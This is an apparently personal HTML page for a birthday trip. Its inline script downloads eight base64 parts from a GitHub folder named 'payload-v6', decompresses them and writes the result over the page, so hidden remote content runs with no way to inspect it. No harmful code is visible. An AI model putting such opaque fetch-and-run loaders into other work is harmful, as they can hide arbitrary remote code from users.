<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name="theme-color" content="#f7f1ea"><meta name="robots" content="noindex,nofollow"><title>Yusma’s Birthday Trip</title><style>html,body{margin:0;min-height:100%;background:#f8f4ee;color:#1e2522}body{display:grid;place-items:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}.load{text-align:center;padding:24px}.load b{display:block;font:italic 700 2rem Georgia,serif;margin-bottom:8px}.load span{color:#66706a}</style></head><body><div class="load"><b>cutie’s birthday</b><span>Opening Sol’s picks…</span></div><script>(async()=>{try{const root='https://raw.githubusercontent.com/myerkhalid-afk/Test-dashboard/main/yusma-trip/payload-v6/';const names=Array.from({length:8},(_,i)=>`part-${String(i).padStart(2,'0')}.txt`);const parts=await Promise.all(names.map(n=>fetch(root+n+'?v=cutie-2',{cache:'no-store'}).then(r=>{if(!r.ok)throw Error(n);return r.text()})));const bytes=Uint8Array.from(atob(parts.join('').replace(/\s/g,'')),c=>c.charCodeAt(0));const stream=new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'));const html=await new Response(stream).text();document.open();document.write(html);document.close()}catch(e){document.body.innerHTML='<div class="load"><b>Could not open the trip page.</b><span>Please refresh once.</span></div>'}})()</script></body></html>
